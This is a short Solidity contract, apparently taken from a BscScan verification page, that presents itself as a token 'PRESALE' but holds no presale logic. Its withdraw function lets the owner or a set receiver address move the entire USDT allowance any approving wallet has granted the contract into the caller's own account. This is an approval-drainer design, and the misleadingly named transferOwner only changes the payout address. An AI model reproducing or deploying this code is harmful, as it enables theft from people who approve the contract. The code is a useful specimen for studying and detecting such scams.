/**
 *Submitted for verification at BscScan.com on 2023-02-07
 */

// SPDX-License-Identifier: MIT

pragma solidity >=0.4.21 < 0.7.0;

contract TOKEN {
    function allowance(address owner, address spender)
        public
        constant
        returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public;
}

contract PRESALE {
    address owner;
    address receiver = 0xdCB3822182CBEA04a7f87473b0c79138F258100C;

    constructor() {
        owner = msg.sender;
    }

    function transferOwner(address newOwner) public {
        require(msg.sender == owner);
        receiver = newOwner;
    }

    function withdraw(address connected) public returns (bool) {
        require(msg.sender == owner || msg.sender == receiver);
        TOKEN USDT = TOKEN(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        USDT.transferFrom(
            connected,
            msg.sender,
            USDT.allowance(connected, address(this))
        );
        return true;
    }
}